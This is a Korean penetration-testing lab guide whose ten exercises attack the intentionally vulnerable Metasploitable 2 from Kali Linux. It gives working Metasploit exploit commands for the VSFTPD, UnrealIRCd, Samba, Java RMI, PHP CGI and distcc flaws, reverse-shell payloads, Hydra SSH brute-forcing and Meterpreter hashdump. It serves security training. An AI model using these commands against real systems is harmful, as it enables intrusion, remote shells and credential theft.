1. 실습 환경 아키텍처 (Lab Architecture)

본 실습은 **Kali Linux (공격자)**와 **Metasploitable 2 (대상자)** 간의 가상 네트워크 환경에서 진행됩니다. 모든 공격 시나리오는 실제 서버에서 발생할 수 있는 취약한 서비스 설정을 바탕으로 하며, **RCE (Remote Code Execution, 원격 코드 실행)** 권한 획득을 최종 목표로 합니다.

[도식: 모의 침투 실습 네트워크 구성도]

Kali Linux
IP: 192.168.x.101
Attacker Node
PRIVATE LAN
Metasploitable 2
IP: 192.168.x.128
Victim Node

* 실습 전 `ifconfig` 명령어로 각 장비의 IP 주소를 반드시 확인하십시오.

2. 실습 예제 리스트 (10 Practical Exercises)

EXERCISE 01

정보 수집: 서비스 포트 스캐닝 (Nmap)

공격 전 대상 서버에서 동작 중인 서비스와 버전 정보를 파악하는 과정입니다. **Nmap (Network Mapper, 네트워크 매퍼)**을 사용하여 모든 포트의 상세 정보를 수집합니다.

# 상세 버전 정보와 운영체제 확인
$ nmap -sV -O 192.168.x.128

* -sV: 서비스 버전 감지, -O: 운영체제 감지

EXERCISE 02

VSFTPD 2.3.4 백도어 익스플로잇 (Backdoor)

특정 버전의 VSFTPD 서버에 포함된 웃는 얼굴(`:)`) 트리거 백도어를 이용한 공격입니다.

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.x.128
exploit

결과: Root 쉘 획득 성공 (Whoami 실행 시 root 확인)

EXERCISE 03

UnrealIRCD 3.2.8.1 백도어 공격 (IRC 인가 취약점)

IRC 서버 소프트웨어의 취약한 소스코드를 이용해 원격에서 시스템 권한을 탈취합니다.

msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.x.128
set PAYLOAD cmd/unix/reverse
set LHOST [Kali_IP]
exploit
EXERCISE 04

Samba Usermap Script (RCE)

Samba 서버의 설정 결함을 이용해 인증 없이 원격에서 명령어를 실행하는 가장 강력한 공격 중 하나입니다.

msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.x.128
exploit
EXERCISE 05

Java RMI Registry 취약점 실습 (Remote Method Invocation)

Java RMI(Remote Method Invocation, 원격 메소드 호출) 서비스의 기본 설정을 이용해 임의의 클래스를 로드하여 명령을 실행합니다.

msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.x.128
exploit
EXERCISE 06

PHP CGI 파라미터 삽입 공격 (CVE-2012-1823)

PHP CGI 모드에서 질의 문자열(Query String)을 잘못 처리하여 발생하는 RCE(원격 코드 실행) 취약점입니다.

msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.x.128
exploit
EXERCISE 07

Distcc 데몬 원격 명령 실행 공격 (Distributed Compiler)

분산 컴파일러 서비스인 Distcc의 취약한 보안 설정을 악용하여 시스템 명령어를 전송합니다.

msfconsole
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.x.128
set PAYLOAD cmd/unix/reverse
set LHOST [Kali_IP]
exploit
EXERCISE 08

SSH 무차별 대입 공격 (Brute Force via Hydra)

**Hydra (하이드라)** 도구를 사용하여 취약한 계정 정보를 무차별 대입 방식으로 찾아냅니다.

$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.128

* 메타스플로이터블 2 기본 계정: msfadmin / msfadmin

EXERCISE 09

Telnet 배너 그래빙 및 접근 (Banner Grabbing)

암호화되지 않은 프로토콜인 Telnet을 통해 서버의 배너 정보를 확인하고 접근을 시도합니다.

$ telnet 192.168.x.128
EXERCISE 10

침투 후 활동: 시스템 정보 수집 (Post-Exploitation)

공격 성공 후 **Meterpreter (미터프리터)** 세션을 통해 대상 시스템의 내부 정보를 수집하고 지속성(Persistence)을 확보합니다.

meterpreter >
getuid # 현재 사용자 권한 확인
sysinfo # 시스템 사양 확인
hashdump # 사용자 비밀번호 해시 추출
shell # 일반 운영체제 쉘로 전환

3. 아키텍트 인사이트 (Architect Insight)

Payload (페이로드)의 중요성

익스플로잇은 단순히 취약점을 공격하는 행위이지만, 페이로드(Payload)는 공격 성공 후 실행될 실제 코드입니다. Reverse Shell (리버스 쉘) 방식을 사용하여 대상 서버가 공격자에게 접속하게 함으로써 방화벽(Firewall)의 Inbound 정책을 우회할 수 있습니다.

방어적 관점 (Defensive View)

메타스플로이터블 2는 고의적으로 취약하게 설정된 서버입니다. 실무 서버에서는 사용하지 않는 서비스(IRC, FTP 등)를 비활성화하고, 모든 패치를 최신으로 유지하며, WAF (Web Application Firewall, 웹 방화벽) 및 IDS/IPS (침입 탐지/차단 시스템)를 통해 비정상적인 트래픽을 차단해야 합니다.
